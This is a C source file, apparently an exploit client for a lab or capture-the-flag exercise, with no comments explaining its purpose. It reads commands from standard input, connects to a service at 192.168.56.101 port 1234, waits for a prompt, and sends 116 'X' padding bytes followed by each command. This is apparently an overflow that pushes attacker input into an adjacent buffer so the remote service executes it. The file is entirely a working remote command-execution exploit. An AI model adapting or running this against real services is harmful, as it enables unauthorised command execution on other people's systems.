#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>


int send_terminal(char *command);

int debug = 0;


int main(int argc, char* argv[]) {

	while (1) {
		char command[100];
		memset(command, 0, 100);
    	fgets(command, 100, stdin);
		char *command_pointer = command;
		if (debug) printf("Command : %s\n",command);

		send_terminal(command_pointer);

	};

	return 0;

}



int send_terminal(char *command) {
	//Our socket
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (debug) printf("Socket created\n");

	//Configure the destination
	char dest_ip_adress[] = "192.168.56.101";
	struct sockaddr_in dest;
	memset(&dest,0,sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_port = htons(1234);
	inet_pton(AF_INET, dest_ip_adress, &(dest.sin_addr));

	//Connect to dest
	connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in));
	if (debug) printf("Socket connected to destination\n");

	//Wait to receive the question
	char recveive_buf[500];
	memset(recveive_buf, 0, 500);
	int receive_length = recv(sockfd, recveive_buf, 500, 0); //receive in bytes
	if (debug) {
		printf("Receive length : %d\n", receive_length);
		printf("Message received : %s\n", recveive_buf);
	};
	if (receive_length == -1) printf("ERROR : RECEIVE");

	//Send the anwser with the command
	char data_to_send[256];
	char *data = data_to_send;
	for (int i = 0 ; i < 116 ; i++) *(data + i) = 'X';
	*(data + 116) = '\0';
	strcat(data_to_send, command);
	send(sockfd, data_to_send, strlen(data_to_send), 0);
	if (debug) printf("Message sent\n");

	//Wait to receive the question
	memset(recveive_buf, 0, 500);
	receive_length = recv(sockfd, recveive_buf, 500, 0); //receive in bytes
	if (debug) {
		printf("Receive length : %d\n", receive_length);
		printf("Message received : %s\n", recveive_buf);
	};
	if (receive_length == -1) printf("ERROR : RECEIVE");

	return 0;

};
